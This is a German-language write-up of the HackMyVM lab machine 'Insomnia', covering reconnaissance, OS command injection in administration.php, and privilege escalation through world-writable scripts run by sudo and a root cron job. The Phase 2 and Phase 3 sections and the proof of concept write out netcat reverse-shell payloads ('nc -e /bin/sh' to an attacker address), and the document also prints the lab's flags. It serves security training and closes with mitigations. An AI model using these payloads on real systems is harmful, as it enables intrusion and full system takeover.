# Insomnia (HackMyVM) - Penetration Test Bericht

![Insomnia.png](Insomnia.png)

**Datum des Berichts:** 4. November 2022  
**VM:** Insomnia  
**Plattform:** HackMyVM [https://hackmyvm.eu/machines/machine.php?vm=Insomnia](https://hackmyvm.eu/machines/machine.php?vm=Insomnia)  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Insomnia_HackMyVM_Easy/](https://alientec1908.github.io/Insomnia_HackMyVM_Easy/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration & Initial Access (Command Injection)](#phase-2-web-enumeration--initial-access-command-injection)
5.  [Phase 3: Privilege Escalation (Kette)](#phase-3-privilege-escalation-kette)
    *   [www-data zu Julia (Sudo & beschreibbares Skript)](#www-data-zu-julia-sudo--beschreibbares-skript)
    *   [Julia zu Root (Cronjob & beschreibbares Skript)](#julia-zu-root-cronjob--beschreibbares-skript)
6.  [Proof of Concept (Root Access via Cronjob)](#proof-of-concept-root-access-via-cronjob)
7.  [Flags](#flags)
8.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Insomnia" von HackMyVM (Schwierigkeitsgrad: Easy). Die initiale Erkundung offenbarte lediglich einen offenen HTTP-Port (8080), auf dem ein PHP CLI Server mit einer "Chat"-Anwendung lief. Die Enumeration der Webanwendung führte zur Entdeckung der Datei `administration.php`. Diese war anfällig für OS Command Injection über den GET-Parameter `logfile`. Dies ermöglichte den initialen Zugriff als Benutzer `www-data` durch Ausführung einer Reverse Shell.

Die Privilegieneskalation erfolgte in zwei Schritten:
1.  **www-data zu Julia:** `www-data` durfte ein Shell-Skript (`/var/www/html/start.sh`) via `sudo` als Benutzer `julia` ausführen. Da dieses Skript weltweit beschreibbar war, konnte eine Reverse-Shell-Payload angehängt und ausgeführt werden, um eine Shell als `julia` zu erhalten.
2.  **Julia zu Root:** Ein Cronjob in `/etc/crontab` führte jede Minute ein weiteres Shell-Skript (`/var/cron/check.sh`) als `root` aus. Auch dieses Skript war weltweit beschreibbar. Durch Anhängen einer Reverse-Shell-Payload an dieses Skript wurde Root-Zugriff erlangt.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `nikto`
*   `curl`
*   `dirb`
*   `wfuzz`
*   `nc (netcat)`
*   `python3` (`pty.spawn`)
*   `stty`
*   `sudo`
*   `ls`, `cat`, `file`, `echo`, `cd`, `find`, `uname`, `ss`, `grep`, `id`, `export`, `bash`

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan:**
    *   `arp-scan -l` identifizierte das Ziel `192.168.2.111` (VirtualBox VM).

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -A 192.168.2.111 -p-`) offenbarte:
        *   **Port 8080 (HTTP):** PHP cli server 7.3.19 (Seitentitel: "Chat", Hostname: `insomnia`). Kein anderer Port war offen.

---

## Phase 2: Web Enumeration & Initial Access (Command Injection)

1.  **Web-Enumeration:**
    *   `gobuster dir` auf `http://192.168.2.111:8080` scheiterte zunächst, da der Server für nicht existierende URLs mit Status 200 antwortete.
    *   `nikto` fand fehlende Sicherheitsheader und den `X-Powered-By: PHP/7.3.19`-Header.
    *   Die Analyse des Quellcodes der Startseite (`index.php`) enthüllte die Existenz von `process.php` und die Parameter `function`, `message`, `nickname`, `file` für POST-Requests.
    *   `dirb` fand die Dateien `administration.php`, `chat.txt`, `index.php`, `process.php`.
    *   `wfuzz` auf `administration.php` fand den GET-Parameter `logfile`.

2.  **Identifizierung der Command Injection:**
    *   Der `logfile`-Parameter in `administration.php` war anfällig für OS Command Injection.
        *   `administration.php?logfile=test` -> Reflektierte "test".
        *   `administration.php?logfile=chat.txt` -> Zeigte den Inhalt von `chat.txt`.

3.  **Initial Access als `www-data`:**
    *   Die Command Injection wurde genutzt, um eine Reverse Shell zu starten:
        ```bash
        # Auf Angreifer-Maschine:
        # nc -lvnp 4444
        # Über Browser/Curl (URL-kodiert):
        # http://192.168.2.111:8080/administration.php?logfile=chat.txt;nc%20-e%20/bin/sh%20[Angreifer-IP]%204444
        ```
    *   Initialer Zugriff als `www-data` wurde erlangt und die Shell stabilisiert.

---

## Phase 3: Privilege Escalation (Kette)

### www-data zu Julia (Sudo & beschreibbares Skript)

1.  **Sudo-Rechte-Prüfung für `www-data`:**
    *   `www-data@insomnia:~/html$ sudo -l` zeigte:
        ```
        User www-data may run the following commands on insomnia:
            (julia) NPASSWD: /bin/bash /var/www/html/start.sh
        ```
2.  **Analyse von `/var/www/html/start.sh`:**
    *   Das Skript `start.sh` enthielt den Befehl `php -S 0.0.0.0:8080`.
    *   Die Berechtigungen waren `-rwxrwxrwx` (weltweit beschreibbar).

3.  **Ausnutzung:**
    *   Eine Netcat-Reverse-Shell-Payload wurde an `start.sh` angehängt:
        ```bash
        echo 'nc -e /bin/sh [Angreifer-IP] 5555' >> /var/www/html/start.sh
        ```
    *   Das modifizierte Skript wurde ausgeführt:
        ```bash
        sudo -u julia /bin/bash /var/www/html/start.sh
        ```
    *   Ein `nc`-Listener auf Port `5555` empfing die Shell als Benutzer `julia`.
    *   Die User-Flag `c2e285cb33cecdbeb83d2189e983a8c0` wurde in `/home/julia/user.txt` gefunden.

### Julia zu Root (Cronjob & beschreibbares Skript)

1.  **Enumeration als `julia`:**
    *   `sudo -l` zeigte, dass `julia` ein Passwort für `sudo` benötigt.
    *   SUID-Suche fand keine ungewöhnlichen Binaries.
    *   Die System-Crontab (`cat /etc/crontab`) enthielt einen kritischen Eintrag:
        ```cron
        * * * * * root /bin/bash /var/cron/check.sh
        ```
    *   Das Skript `/var/cron/check.sh` hatte die Berechtigungen `-rwxrwxrwx` (weltweit beschreibbar).

2.  **Ausnutzung des Cronjobs:**
    *   Eine Netcat-Reverse-Shell-Payload wurde an `/var/cron/check.sh` angehängt:
        ```bash
        echo 'nc -e /bin/sh [Angreifer-IP] 4447' >> /var/cron/check.sh
        ```
    *   Ein `nc`-Listener auf Port `4447` wurde gestartet.
    *   Nach maximal einer Minute führte der Cronjob das modifizierte Skript als `root` aus und startete die Reverse Shell.
    *   `id` in der neuen Shell bestätigte `uid=0(root)`.

---

## Proof of Concept (Root Access via Cronjob)

**Kurzbeschreibung:** Die finale Privilegieneskalation von `julia` zu `root` nutzte einen unsicher konfigurierten Cronjob aus. Dieser führte jede Minute das Skript `/var/cron/check.sh` als `root` aus. Da dieses Skript weltweit beschreibbar war, konnte der Benutzer `julia` eine Reverse-Shell-Payload anhängen. Beim nächsten Ausführen des Cronjobs wurde die Payload mit Root-Rechten ausgeführt.

**Schritte (als `julia`):**
1.  Hänge eine Reverse-Shell-Payload an `/var/cron/check.sh` an:
    ```bash
    echo 'nc -e /bin/sh [IP_DES_ANGREIFERS] [PORT]' >> /var/cron/check.sh
    # z.B. echo 'nc -e /bin/sh 192.168.2.121 4447' >> /var/cron/check.sh
    ```
2.  Starte einen Netcat-Listener auf dem Angreifer-System auf dem gewählten Port:
    ```bash
    nc -lvnp [PORT] # z.B. nc -lvnp 4447
    ```
3.  Warte maximal eine Minute, bis der Cronjob ausgeführt wird.
**Ergebnis:** Eine Reverse Shell mit `uid=0(root)` verbindet sich zum Listener.

---

## Flags

*   **User Flag (`/home/julia/user.txt`):**
    ```
    c2e285cb33cecdbeb83d2189e983a8c0
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    c84baebe0faa2fcdc2f1a4a9f6e2fbfc
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **Webanwendungssicherheit:**
    *   **DRINGEND:** Beheben Sie die OS Command Injection Schwachstelle in `administration.php`. Alle Benutzereingaben (insbesondere GET/POST-Parameter) müssen strikt validiert und saniert werden, bevor sie in Systembefehlen verwendet werden.
    *   Konfigurieren Sie den Webserver (auch PHP Development Server) so, dass er korrekte 404-Fehlercodes für nicht existierende Seiten sendet.
    *   Entfernen Sie den `X-Powered-By`-Header und implementieren Sie empfohlene Sicherheitsheader (X-Frame-Options, X-Content-Type-Options, Content-Security-Policy).
    *   Sanitisieren Sie Eingaben, die in Log-Dateien (`chat.txt`) geschrieben werden, um Stored XSS zu verhindern.
*   **Sudo-Konfiguration:**
    *   **DRINGEND:** Überprüfen und härten Sie die `sudo`-Regel, die `www-data` erlaubt, `/var/www/html/start.sh` als `julia` auszuführen. Das Ausführen von Skripten über `sudo` ist riskant, insbesondere wenn das Skript beschreibbar ist.
*   **Dateisystemberechtigungen:**
    *   **KRITISCH:** Korrigieren Sie die unsicheren (weltweit beschreibbaren) Berechtigungen für die Skripte `/var/www/html/start.sh` und `/var/cron/check.sh`. Diese sollten nur für den Eigentümer (idealerweise `root` oder der dedizierte Benutzer) schreibbar sein (z.B. `chmod 755` oder `chmod 700`).
*   **Cronjob-Sicherheit:**
    *   **KRITISCH:** Überprüfen Sie alle Cronjobs auf unsichere Konfigurationen. Stellen Sie sicher, dass Skripte, die von Root-Cronjobs ausgeführt werden, nicht von unprivilegierten Benutzern modifiziert werden können. Verwenden Sie absolute Pfade für alle Befehle in Cronjobs.
*   **Produktionsumgebungen:**
    *   Verwenden Sie **niemals** den PHP Development Server für produktive, öffentlich erreichbare Dienste. Setzen Sie stattdessen auf robuste Webserver wie Nginx oder Apache mit sicheren Konfigurationen.
*   **Allgemeine Systemhärtung:**
    *   Implementieren Sie das Prinzip der geringsten Rechte für alle Benutzer und Prozesse.
    *   Überwachen Sie Systemlogs auf verdächtige Aktivitäten.

---

**Ben C. - Cyber Security Reports**
